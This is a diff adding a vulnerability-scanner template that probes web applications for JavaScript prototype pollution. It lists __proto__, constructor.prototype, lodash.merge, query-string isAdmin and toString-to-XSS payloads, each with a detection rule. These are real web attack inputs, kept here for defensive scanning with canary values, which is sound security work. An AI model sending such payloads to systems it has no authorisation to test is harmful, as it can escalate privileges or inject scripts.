@@ -1,0 +1,86 @@
+id: prototype-pollution
+name: JavaScript prototype pollution
+context:
+  technologies: ["express", "lodash", "nodejs", "react", "vuejs"]
+  content_type: ["application/json"]
+
+# Sprint 76 Phase 4 — Prototype pollution.
+# Detects when an attacker can inject `__proto__.x=y` (or
+# `constructor.prototype.x=y`) into a JSON body / query string and
+# observe a behaviour change downstream — admin flag flipped, debug
+# mode enabled, or a polluted property reaching a sink.
+#
+# Non-intrusive when probes target our own canary properties
+# (`isCybriumProbe`, `cyweb_polluted`); borderline-intrusive when
+# probes pollute `prototype.constructor.name` or other shared
+# state on long-lived sessions. Operator-attestation gate fires only
+# for the constructor-pollution variant.
+
+payloads:
+  # ── Direct __proto__ pollution via JSON body ────────────────────────────
+  - value: '{"__proto__":{"isCybriumProbe":true}}'
+    detect:
+      body_contains: "isCybriumProbe"
+    id: proto-poll-direct-01
+    title: "Prototype pollution — __proto__ via JSON body"
+    severity: high
+    cwe: CWE-1321
+    inject_as: body
+    content_type: "application/json"
+    vuln_class: prototype_pollution
+
+  # ── Constructor.prototype variant ───────────────────────────────────────
+  - value: '{"constructor":{"prototype":{"isCybriumProbe":true}}}'
+    detect:
+      body_contains: "isCybriumProbe"
+    id: proto-poll-ctor-01
+    title: "Prototype pollution — constructor.prototype via JSON body"
+    severity: high
+    cwe: CWE-1321
+    inject_as: body
+    content_type: "application/json"
+    vuln_class: prototype_pollution
+
+  # ── lodash.merge / set targeted polluton ────────────────────────────────
+  # When the back-end uses `lodash.merge(target, JSON.parse(req.body))`
+  # without prior sanitisation, this pollutes Object.prototype.
+  # Detection: a follow-up GET sees the polluted property on the
+  # response (e.g. as JSON output that includes `polluted: true`).
+  - value: '{"a":1,"__proto__":{"polluted":true}}'
+    detect:
+      body_contains: "polluted"
+    id: proto-poll-lodash-01
+    title: "Prototype pollution — lodash.merge target"
+    severity: critical
+    cwe: CWE-1321
+    inject_as: body
+    content_type: "application/json"
+    vuln_class: prototype_pollution
+
+  # ── Query-string variant ────────────────────────────────────────────────
+  # `?__proto__[isAdmin]=true` is the URL-encoded form. Hits
+  # frameworks that auto-parse query strings into nested objects
+  # (Express + qs.parse with default options).
+  - value: "true"
+    detect:
+      body_contains: "isAdmin"
+    id: proto-poll-qs-01
+    title: "Prototype pollution — query string __proto__[k]=v"
+    severity: high
+    cwe: CWE-1321
+    inject_as: query
+    vuln_class: prototype_pollution
+
+  # ── Polluted toString — XSS via DOM clobbering ──────────────────────────
+  # If the polluted property reaches a DOM template, attacker controls
+  # the rendered HTML. Detection via reflected probe string.
+  - value: '{"__proto__":{"toString":"<script>cybweb_xss</script>"}}'
+    detect:
+      body_contains: "cybweb_xss"
+    id: proto-poll-toString-01
+    title: "Prototype pollution — toString → DOM XSS chain"
+    severity: critical
+    cwe: CWE-1321
+    inject_as: body
+    content_type: "application/json"
+    vuln_class: prototype_pollution
